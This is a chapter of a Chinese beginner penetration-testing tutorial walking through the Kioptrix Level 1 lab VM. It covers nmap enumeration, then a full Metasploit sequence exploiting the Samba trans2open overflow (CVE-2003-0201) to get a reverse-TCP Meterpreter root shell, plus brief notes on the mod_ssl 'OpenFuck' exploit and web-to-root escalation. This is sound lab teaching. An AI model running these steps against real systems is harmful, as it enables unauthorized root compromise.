## 28.2 靶机搭建注意事项

好了，介绍完了，咱们开始动手搭环境！

不过！在开始之前，我必须先给大家打个预防针——Kioptrix这个靶机有点"老古董"了，搭建的时候可能会遇到一些网络问题。别担心，这都是正常的，我会教你怎么解决。🛠️

### 28.2.1 ⚠️ 特别提醒：网络模式问题

首先，最重要的一点：**Kioptrix默认是桥接模式，但很可能拿不到IP，一定要改成NAT模式！**

为什么会这样呢？因为Kioptrix是个很老的靶机了（2010年左右的），它的网络配置有点"复古"。在桥接模式下，它可能跟你的物理网络不兼容，导致拿不到IP地址，你就找不到它了。

这就好比一个老人家，用惯了老年机，你给他个智能手机，他可能不会用，连不上网。这时候你就得帮他调整一下设置。📱

**那怎么改成NAT模式呢？**

很简单：
1. 在VMware里，选中Kioptrix虚拟机
2. 点击"编辑虚拟机设置"
3. 找到"网络适配器"
4. 把网络连接从"桥接模式"改成"NAT模式"
5. 点击确定，完事！

改完之后，记得重启一下虚拟机哦。

### 28.2.2 网络配置小技巧

如果改成NAT模式之后还是有问题，怎么办？别慌，我还有几个小妙招：

**方法一：移除网络适配器再重新添加**

有时候虚拟网卡会"抽风"，这时候最简单粗暴的方法就是：
1. 把网络适配器删掉
2. 再重新加一个新的网络适配器
3. 设置成NAT模式
4. 开机试试

这就好比你的电脑连不上网了，你把网卡禁用再启用一下，说不定就好了。💻

**方法二：修改.vmx文件（新手了解一下就行）**

如果上面的方法都不行，还可以试试修改虚拟机的.vmx配置文件。不过这个方法稍微有点技术含量，新手知道有这么回事就行，真遇到问题了再去搜具体教程。

简单说一下思路：找到虚拟机文件夹里的.vmx文件，用记事本打开，找到关于ethernet的配置项，改一改就行。

### 28.2.3 下载和导入靶机

Kioptrix Level 1的下载地址，大家可以去VulnHub官网搜"Kioptrix Level 1"，或者直接在网上搜，资源很多。

下载下来之后，是一个压缩包，解压之后会有.ova或者.vmdk文件。导入VMware的方法跟之前的Jangow一样，这里就不多说了。

导入完成后，**一定要记得把网络模式改成NAT！一定要记得改成NAT！一定要记得改成NAT！** 重要的事情说三遍！📢

### 28.2.4 找靶机IP（arp-scan）

虚拟机开机之后，我们需要找到它的IP地址。怎么找呢？用arp-scan！

打开你的Kali Linux，输入命令：

```bash
arp-scan -l
```

什么是arp-scan呢？它就像一个"网络雷达"，在你的局域网里扫一圈，把所有在线的设备都列出来，包括它们的IP地址和MAC地址。📡

扫完之后，你会看到一个列表，里面有你的Kali主机，还有你的靶机。怎么分辨哪个是靶机呢？看MAC地址的厂商信息，Kioptrix的网卡厂商一般是"VMware, Inc."或者类似的。

如果你不确定哪个是，可以先记下来几个可疑的IP，后面用nmap扫一下就知道了。

## 28.3 信息收集：知己知彼，百战不殆

找到了靶机IP，接下来我们要做什么呢？——**信息收集**！

老话说得好：知己知彼，百战不殆。打仗之前，你得先了解敌人的情况。打靶机也是一样，你得先知道目标开了哪些端口、跑了哪些服务、版本号是多少，然后才能针对性地找漏洞。

这就好比你要去偷一个城堡（当然只是打比方啊！），你得先围着城堡转一圈，看看有几个城门、几个窗户、守卫多不多、城墙高不高，然后再决定从哪里下手。🏰

### 28.3.1 Nmap端口扫描

信息收集的第一步，就是端口扫描。用什么扫呢？当然是我们的老朋友——Nmap！

输入命令：

```bash
nmap -sV -sC 靶机IP
```

给大家解释一下这几个参数是什么意思：
- `-sV`：探测服务版本号（Version）
- `-sC`：使用默认脚本扫描（Script）

什么？你忘了Nmap是啥了？没关系，我再用大白话给你解释一遍：
- Nmap就像一个"敲门的人"，它挨个敲靶机的"门"（端口）
- 如果门开着（端口开放），它就会问一句："你是谁呀？你是什么版本呀？"
- 然后把答案记录下来，告诉你

那我们来看看Kioptrix Level 1上都开了哪些端口呢？一般来说，你会看到类似这样的结果：

| 端口 | 服务 | 说明 |
|------|------|------|
| 22 | SSH | 远程登录服务 |
| 80 | HTTP | 网站服务 |
| 111 | rpcbind | 远程过程调用 |
| 139 | NetBIOS | （Samba相关） |
| 443 | HTTPS | 加密的网站服务 |
| 445 | Samba | 文件共享服务 |
| 1024 | 其他 | 一些其他服务 |

哇，开了好多端口啊！看着是不是有点眼花缭乱？别慌，我们一个一个来看。🔍

### 28.3.2 服务版本探测

光知道开了哪些端口还不够，我们还得知道每个服务的**具体版本号**。为什么版本号这么重要呢？

因为漏洞都是跟版本挂钩的！就像你知道了一个人的年龄，就能大概猜到他可能得什么病（比如老年人容易得高血压，年轻人容易得感冒）。知道了服务版本，你就能去查这个版本有没有什么已知漏洞。

这就好比你买二手手机，你得先知道这手机是什么型号、什么系统版本，然后才能查这个版本有没有什么已知的bug。📱

那Kioptrix上的服务都是什么版本呢？大概是这样的：
- **Apache**：1.3.20（超级老的版本！）
- **OpenSSL**：0.9.6b（也超级老！）
- **Samba**：2.2.1a（老古董级别的！）
- **SSH**：OpenSSH 2.9p2（同样很老）

看到了吗？这些版本号都超级老！老版本意味着什么？——**漏洞多啊！** 🎯

就像一个用了十几年的老房子，门窗都老化了，锁也生锈了，想进去还不容易？

### 28.3.3 Web信息收集

除了端口扫描，我们还要看看网站上面有什么东西。毕竟80和443端口都开着呢，说不定有Web漏洞。

打开浏览器，输入靶机IP地址，访问一下看看。

你会看到什么呢？——一个很简单的Apache默认页面，上面写着"**Welcome to 2Xploits S.A**"之类的话，看起来像是个测试页面。

嗯……看起来有点简陋啊。那怎么办呢？——**目录扫描！**

我们可以用dirb、gobuster或者dirsearch这些工具来扫一下目录，看看网站有没有隐藏的文件或者文件夹。

比如用dirb：

```bash

```

扫完之后，你可能会发现一些东西，比如：
- `/manual/`：Apache的手册目录
- `/usage/`：一些统计信息
- `/test/`：测试页面
- 等等……

不过老实说，Kioptrix Level 1的Web层面漏洞不多，主要的突破口不在Web上。但我们还是要扫一下，养成信息收集的好习惯。万一呢？是吧？😏

## 28.4 思路一：Samba漏洞提权（最经典的方法）

好了，信息收集得差不多了，接下来我们开始搞事情！

今天我们重点讲**第一种方法**——也是最经典、最有名的方法：**利用Samba的trans2open缓冲区溢出漏洞，直接拿root权限！**

为什么重点讲这个方法呢？因为它太经典了，几乎所有打Kioptrix的人，第一个学会的都是这个方法。而且用这个方法，我们还能顺便学一下大名鼎鼎的Metasploit怎么用，一举两得！💯

### 28.4.1 什么是Samba？

首先，我们来搞清楚一个问题：**Samba是什么？**

用官方的话说：Samba是在Linux和Unix系统上实现SMB协议的一个免费软件。

用人话说：**Samba就是Linux上的"文件共享"服务。** 📁

你可能听说过Windows的"网上邻居"，可以在不同电脑之间共享文件。那Linux怎么跟Windows共享文件呢？——用Samba！

Samba就像一个翻译官，让Linux和Windows能够互相听懂对方的话，实现文件共享。比如你公司的文件服务器，很可能就是用Samba搭的。

那Samba跟我们打靶机有什么关系呢？——关系大了！因为Samba如果有漏洞，黑客就能利用这个漏洞，直接控制你的服务器！

### 28.4.2 Samba版本和漏洞

我们刚才用nmap扫出来，Kioptrix上的Samba版本是**2.2.1a**。

这个版本是什么概念呢？这么说吧，这是2002年左右的版本，比很多正在看这本书的小伙伴的年龄都大！👴

这么老的版本，漏洞那肯定是一抓一大把啊。其中最有名的一个漏洞，叫做 **"Trans2open缓冲区溢出漏洞"**，CVE编号是 **CVE-2003-0201**。

什么是缓冲区溢出呢？我用大白话给你解释一下：

想象一下，你有一个杯子（缓冲区），它只能装500毫升水。但是你非要往里面倒1000毫升水，会怎么样？——水会溢出来，流到桌子上、地上，到处都是。💧

计算机里的缓冲区溢出也是一个道理。程序给某个数据预留了一块内存空间（就像杯子），但是如果输入的数据太长（就像倒太多水），超出了预留的空间，数据就会"溢出来"，覆盖掉旁边的内存区域。

如果黑客精心构造溢出的数据，就能让程序执行他想要的代码，从而控制整个系统。这就是缓冲区溢出漏洞的原理。

而Samba的trans2open函数，就有这么一个缓冲区溢出漏洞。黑客可以向Samba服务发送一个精心构造的请求，触发缓冲区溢出，然后执行任意代码。

最可怕的是：**Samba服务一般都是用root权限运行的**，所以利用这个漏洞，攻击者可以直接拿到root权限！一步到位，都不用提权了！😱

这就好比你去别人家偷东西，本来打算撬门进去，结果发现门没锁，而且保险箱的钥匙就在门口的桌子上——直接就能拿到最值钱的东西！

### 28.4.3 怎么利用这个漏洞？

知道了有漏洞，那怎么利用呢？

有两种方法：
1. **用Metasploit（MSF）**：简单粗暴，一键搞定，新手推荐！
2. **手动编译漏洞利用代码（exp）**：比较麻烦，新手了解一下就行

我们今天重点讲第一种方法，用Metasploit来利用这个漏洞。

## 28.5 Metasploit入门科普

在开始动手之前，我先给大家科普一下Metasploit是什么。因为对于新手来说，可能还是第一次听说这个东西。

### 28.5.1 MSF是什么？

**Metasploit**（简称MSF），是渗透测试界的"**瑞士军刀**"，也是最有名、最强大的渗透测试框架，没有之一。🔪

什么是"框架"呢？你可以把它理解成一个"工具箱"，里面装满了各种各样的工具。遇到不同的问题，你就从里面拿出对应的工具来用。

用大白话讲：**Metasploit就是一个"漏洞利用超市"**，里面有几千个现成的漏洞利用模块，你想用哪个就用哪个，不用自己从头写代码。

想象一下：
- 以前的黑客，发现一个漏洞，得自己花几天几夜写漏洞利用代码
- 现在有了Metasploit，你只需要搜一下有没有现成的模块，有就直接用，几分钟搞定
- 这就好比以前做饭得自己种菜、自己磨面、自己生火，现在有了外卖，点一下就送到家了🍔

当然，我不是说自己写exp不好，能自己写当然更厉害。但是对于新手来说，先学会用现成的工具，把流程跑通，再去研究底层原理，这样效率更高。

### 28.5.2 MSF的基本概念

Metasploit里面有几个核心概念，新手必须先搞明白：

**1. Exploit（漏洞利用模块）**
> Exploit就是"漏洞利用代码"。每一个已知漏洞，对应一个exploit模块。比如Samba的trans2open漏洞，就有一个对应的exploit模块。
> 
> 打个比方：exploit就像一把"钥匙"，专门开某一把锁（漏洞）。🔑

**2. Payload（攻击载荷）**
> Payload就是"攻击成功之后，你想让目标执行什么代码"。比如你想拿到一个Shell（命令行界面），那payload就是一个Shell。
> 
> 打个比方：payload就像你"进门之后想干什么"——是想偷东西，还是想装监控，还是想把主人赶出去自己住。🏠

**3. Auxiliary（辅助模块）**
> Auxiliary是"辅助模块"，不是用来拿Shell的，而是用来做信息收集、扫描、枚举等辅助工作的。
> 
> 打个比方：auxiliary就像"侦察兵"，负责打探消息，不直接参与战斗。🔭

简单总结一下：
- **Exploit**：怎么进去（钥匙）
- **Payload**：进去之后干什么（你想做的事）
- **Auxiliary**：打探消息（侦察兵）

### 28.5.3 MSF常用命令

Metasploit的命令很多，但新手不用全记住，先掌握这几个最常用的就行：

| 命令 | 作用 | 大白话解释 |
|------|------|------------|
| `msfconsole` | 启动Metasploit | 打开工具箱 |
| `search 关键词` | 搜索模块 | 在工具箱里找工具 |
| `use 模块名` | 使用某个模块 | 拿起这个工具 |
| `show options` | 查看需要设置的参数 | 看看这个工具怎么用，需要调什么设置 |
| `set 参数名 值` | 设置参数 | 调整工具的设置 |
| `run` / `exploit` | 执行攻击 | 按下开关，开始干活！ |
| `back` | 返回上一级 | 把工具放回去 |
| `exit` | 退出MSF | 把工具箱收起来 |

怎么样？是不是挺简单的？别害怕，用两次就熟了。😉

## 28.6 实战：用MSF打Samba漏洞

好了，理论讲得差不多了，现在开始实战！大家跟着我一步一步来，保证你也能拿下！💪

### 28.6.1 第一步：打开MSF

首先，打开你的Kali Linux，在终端里输入：

```bash
msfconsole
```

然后回车，等待启动。

启动过程中，你会看到一些炫酷的ASCII艺术字和一些提示信息。等它加载完，你就会看到一个 `msf6 >` 的提示符，这就说明MSF启动成功了。

第一次启动可能会慢一点，耐心等一下。喝口水，伸个懒腰，马上就好。☕

### 28.6.2 第二步：搜索漏洞模块

MSF启动之后，我们来搜索一下Samba trans2open漏洞对应的模块。输入命令：

```bash
search trans2open
```

什么意思呢？就是在Metasploit的"工具箱"里，搜一下有没有叫trans2open的工具。

搜索结果大概是这样的：

```
Matching Modules
================

   #  Name                                Disclosure Date  Rank   Check  Description
   -  ----                                ---------------  ----   -----  -----------
   0  exploit/freebsd/samba/trans2open    2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
   1  exploit/linux/samba/trans2open      2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
   2  exploit/solaris/samba/trans2open    2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)
```

哇，出来好几个结果！我们应该选哪个呢？

注意看名字：
- 第一个是 **freebsd** 版本的（FreeBSD系统）
- 第二个是 **linux** 版本的（Linux系统）
- 第三个是 **solaris** 版本的（Solaris系统）

我们的靶机Kioptrix是Linux系统，所以选第二个：`exploit/linux/samba/trans2open`

Rank那一列写的是"great"，说明这个模块的成功率很高，棒棒的！👍

### 28.6.3 第三步：使用模块

找到了对应的模块，接下来我们要"拿起"这个工具。输入命令：

```bash
use exploit/linux/samba/trans2open
```

或者你也可以直接用编号：

```bash
use 1
```

（因为搜索结果里它是第1个，从0开始数的话）

输入完之后，你会看到提示符变成了这样：

```
msf6 exploit(linux/samba/trans2open) >
```

这就说明我们已经成功进入了这个模块，可以开始设置参数了。

### 28.6.4 第四步：查看需要设置的参数

在开始攻击之前，我们得先看看这个模块需要设置哪些参数。就像你用一个新电器，得先看看说明书，知道要插电、要按哪个开关。📖

输入命令：

```bash
show options
```

你会看到类似这样的输出：

```
Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/
   RPORT   139              yes       The target port (TCP)

Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.100    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce
```

看着有点多是不是？别慌，我来给你解释一下哪些是需要我们设置的：

**模块参数（Module options）：**
- `RHOSTS`：**目标主机的IP地址**，这个是必须填的（Required写的yes）
- `RPORT`：目标端口，默认是139，不用改

**Payload参数（Payload options）：**
- `LHOST`：**我们自己（攻击机）的IP地址**，这个也是必须填的
- `LPORT`：我们自己的监听端口，默认4444，一般不用改

为什么需要设置LHOST呢？因为我们用的是"反向连接"的payload——攻击成功后，靶机会主动连接我们的电脑，给我们返回一个Shell。所以靶机需要知道我们的IP地址，才能连回来。

这就好比你去别人家偷东西，得告诉对方"把东西送到我家来"，你得告诉对方你家地址，对吧？（当然只是打比方啊！）🏠

### 28.6.5 第五步：设置参数

好，现在我们来设置参数。

首先设置目标IP（RHOSTS）：

```bash
set RHOSTS 你的靶机IP
```

比如你的靶机IP是192.168.100.128，那就是：

```bash
set RHOSTS 192.168.100.128
```

然后设置我们自己的IP（LHOST）：

```bash
set LHOST 你的Kali IP
```

比如你的Kali IP是192.168.100.129，那就是：

```bash
set LHOST 192.168.100.129
```

不知道自己的Kali IP是多少？打开一个新终端，输入 `ifconfig` 或者 `ip a` 就能看到了。

设置完之后，可以再输入 `show options` 检查一下，确保参数都填对了。

### 28.6.6 第六步：执行攻击！

参数都设置好了吗？好的，激动人心的时刻到了！🎉

输入命令：

```bash
run
```

或者：

```bash
exploit
```

然后回车，开始攻击！

这时候你会看到MSF在尝试各种方法，输出一大堆信息。可能会有一些报错，比如"连接失败"、"超时"之类的，别慌，这是正常的，因为这个模块会尝试好几种不同的返回地址，也就是所谓的"暴力破解"（Bruteforce）。

耐心等一会儿，大概几十秒到一两分钟……

突然！你会看到这样一行字：

```
Meterpreter session 1 opened (192.168.100.129:4444 -> 192.168.100.128:1024)
```

哇！成功了！🎉🎉🎉

这是什么意思呢？就是说：
- 我们成功拿到了一个Meterpreter会话
- 靶机主动连接到了我们的4444端口
- 我们现在可以控制靶机了！

### 28.6.7 第七步：拿到Shell，看看权限

拿到了Meterpreter会话之后，我们能做什么呢？

首先，输入 `shell` 命令，拿到一个系统命令行：

```bash
shell
```

然后你会看到一个命令提示符，比如 `bash-2.05b#` 或者 `sh-2.05b#`。

注意看最后那个字符——是 `#` 还是 `$`？

- 如果是 `#`：恭喜你！你是root权限！
- 如果是 `$`：你是普通用户权限，还需要提权

那我们这个漏洞利用完，是什么权限呢？——**当然是root啊！** 😎

因为Samba服务就是用root运行的，所以溢出成功之后，我们拿到的就是root权限！一步到位，爽不爽？

不信的话，我们输入命令验证一下：

```bash
id
```

或者：

```bash
whoami
```

你会看到输出类似：

```
uid=0(root) gid=0(root) groups=0(root)
```

或者：

```
root
```

看到了吗？uid=0，这就是root用户的标志！我们成功拿到了最高权限！🏆

### 28.6.8 第八步：找flag！

拿到了root权限，接下来做什么？——当然是找flag啊！

flag一般藏在哪里呢？通常在root用户的家目录里，也就是 `/root/` 目录下。

我们来看看：

```bash
cat /root/proof.txt
```

或者：

```bash
cd /root
ls
cat proof.txt
```

然后你就会看到一串神秘的字符串，那就是flag了！🎉

恭喜你！你成功拿下了Kioptrix Level 1！有没有一种成就感爆棚的感觉？

## 28.7 思路二：OpenSSL/Apache漏洞（另一种方法）

好了，第一种方法我们讲完了，是不是很简单？

但是！别忘了Kioptrix的特点——**多种方法可以通关**！我们不能满足于一种方法，对吧？

接下来，我们简单介绍一下第二种思路：利用OpenSSL或者Apache的漏洞。注意哦，这里只是简单带过，让大家知道有这么个思路就行，新手可以先不用深究，知道有这么回事就好。

### 28.7.1 发现线索

我们之前用nmap扫的时候，是不是看到了这些信息？
- Apache版本：1.3.20
- OpenSSL版本：0.9.6b
- 还有一个mod_ssl的版本：2.8.4

这些版本号都超级老，对吧？老版本就意味着有漏洞。

那这些老版本有什么漏洞呢？

### 28.7.2 Apache mod_ssl漏洞

Apache的mod_ssl模块，在旧版本里有一个著名的漏洞，叫做 **"OpenSSL SSLv2 Ciphersuite Rollback漏洞"** 或者叫 **"OpenFuck漏洞"**（对，名字就是这么直白）。

这个漏洞是什么呢？简单说就是：旧版本的OpenSSL在处理SSLv2协议的时候，有一个缓冲区溢出漏洞，黑客可以利用这个漏洞执行任意代码。

利用这个漏洞，也可以直接拿到root权限。

那怎么利用呢？
1. 你可以搜一下对应的漏洞利用代码（exp）
2. 下载下来，编译一下
3. 然后运行，指定目标IP和端口
4. 运气好的话，也能拿到Shell

不过这个方法比用MSF打Samba要麻烦一些，而且成功率不是100%，可能需要多试几次。

有兴趣的小伙伴，可以自己去搜一下"OpenFuck v3"或者"apache mod_ssl exploit"，研究研究。新手的话，知道有这么个思路就行。🤓

### 28.7.3 为什么会有多种方法？

讲到这里，可能有小伙伴会问：为什么一个靶机会有这么多漏洞？是开发者故意留的吗？

哈哈，你说对了一半！

VulnHub的靶机，本来就是故意做成有漏洞的，目的就是让我们练习。但是这些漏洞不是开发者凭空编出来的，而是**历史上真实存在过的漏洞**！

在2000年初的时候，这些漏洞都是真实存在的，也确实有很多服务器被黑过。Kioptrix Level 1就像是一个"活化石"，还原了那个年代的服务器环境，让我们能够亲身体验一下当年的黑客是怎么入侵的。🦕

这也是打靶机的意义所在——**在合法的环境下，学习和研究真实的漏洞**。

## 28.8 思路三：Web漏洞拿Shell再提权

好，我们再来说说第三种思路：从Web层面入手，先拿到WebShell，然后再想办法提权。

同样，这个方法也是简单带过，让大家知道有这么个思路。

### 28.8.1 Web层面有什么漏洞？

Kioptrix Level 1的Web层面，漏洞不多，但也不是完全没有。

比如：
- 目录遍历漏洞？
- 敏感信息泄露？
- 或者某个CGI脚本有漏洞？

你可能会问：什么是CGI？

CGI就是"公共网关接口"，简单说就是**服务器上可以执行的小程序**。比如你在网页上填个表单，点击提交，服务器后台就会运行一个CGI程序来处理你的输入。

旧版本的Apache，经常会有一些CGI脚本有漏洞，比如命令注入、缓冲区溢出之类的。

### 28.8.2 拿到WebShell之后怎么办？

如果运气好，通过Web漏洞拿到了WebShell，那接下来就要提权了。

怎么提权呢？方法有很多，比如：
- 看看系统里有没有什么SUID的程序可以利用
- 看看内核版本有没有什么漏洞
- 看看有没有什么定时任务可以利用
- 看看配置文件里有没有密码

不过Kioptrix Level 1从Web入手的话，路径会比较绕，不如直接打Samba来得痛快。但作为一种思路，我们还是要知道的。

毕竟，真实世界里的目标，不一定有Samba漏洞给你打，这时候你就得从Web入手，一步步来。

## 28.10 打靶场的正确姿势

讲完了Kioptrix，我再跟大家聊聊"打靶场的正确姿势"。很多新手打靶场，方法不对，效率很低，打了很多也没什么进步。希望下面这几点建议，能帮到大家。

### 28.10.1 不要满足于一种方法

第一点：**打完一个靶机，不要满足于一种方法**。

就像Kioptrix，你用Samba漏洞打完了，就完事了？NONONO！你应该再想想：还有没有其他方法？比如OpenSSL漏洞行不行？Web漏洞行不行？

每多学一种方法，你就多掌握一个知识点，你的技术就更全面一点。

这就像做题，一道题你会了一种解法，还应该想想有没有第二种、第三种解法。这样你的思维才会越来越灵活。✏️

### 28.10.2 打完看Writeup，学习新思路

第二点：**打完之后，一定要去看看别人的Writeup（解题报告）**。

为什么呢？因为别人的思路可能跟你不一样，别人可能用了你没想到的方法，别人可能有更巧妙的技巧。

看看别人是怎么打的，对比一下自己的方法，想想：
- 哪里我没想到？
- 哪里可以改进？
- 别人的方法好在哪里？

这样进步才快。

这就像上学的时候，考完试老师会讲卷子，你不光要知道自己哪里错了，还要看看别人的解题思路，学习好的方法。📝

### 28.10.3 做好笔记

第三点：**一定要做好笔记！**

好记性不如烂笔头。打了那么多靶机，过段时间你可能就忘了。这时候笔记就很重要了。

笔记里应该记些什么呢？
- 靶机名称和难度
- 信息收集的结果（开了哪些端口，什么版本）
- 利用了什么漏洞
- 具体的利用步骤和命令
- 提权的方法
- 心得体会

以后再遇到类似的漏洞，翻翻笔记，马上就能想起来。而且笔记也是你成长的见证，过段时间回头看，你会发现自己进步了很多。📒

### 28.10.4 不要光看不练

第四点：**不要光看不练，一定要自己动手打！**

很多新手喜欢看教程、看视频，觉得"我看懂了"，但真到自己动手的时候，就各种出错。这就是"一看就会，一做就废"。😂

为什么会这样呢？因为看和做是两回事。看的时候，你跟着别人的思路走，觉得很顺畅；但自己做的时候，会遇到各种各样意想不到的问题。

只有自己动手打，遇到问题，解决问题，你才能真正掌握。记住：**实践出真知！**
